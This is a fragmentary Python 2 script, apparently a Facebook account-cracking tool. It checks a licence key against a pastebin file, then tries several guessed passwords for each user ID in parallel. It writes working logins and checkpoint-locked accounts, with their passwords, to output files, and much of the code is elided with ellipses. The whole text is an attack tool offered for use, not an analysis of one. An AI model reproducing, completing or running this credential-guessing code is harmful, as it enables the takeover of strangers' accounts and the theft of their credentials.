...
\033[1;93m➤\033[1;97m Facebook : AjMaL
...
def reg():
    ...
    r = requests.get('https://pastebin.com/raw/iRbR16RC/main/server.txt').text
    if to in r:
...
def a_s():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                print '\033[1;97m[TOOR-CP]➤ ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;95m[NAZIR-OK]➤ ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/YOUSAF_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['YOUSAFF']:
                    print '\033[1;97m[TOR-CP]➤ ' + uid + ' | ' + pass2
                    cp = open('YOUSAF_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;95m[NAZIR-OK]➤ ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/YOUSAF_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['YOUSAFF']:
                        print '\033[1;97m[TOR-CP]➤ ' + uid + ' | ' + pass3
                        cp = open('YOUSAF_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;95m[NAZIR-OK]➤ ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/YOUSAF_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['YOUSAFF']:
                            print '\033[1;97m[TOR-CP]➤ ' + uid + ' | ' + pass4
                            cp = open('YOUSAF_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92mBAAKI NAAME TO SONAA HOGA [TOR AJMALO]'
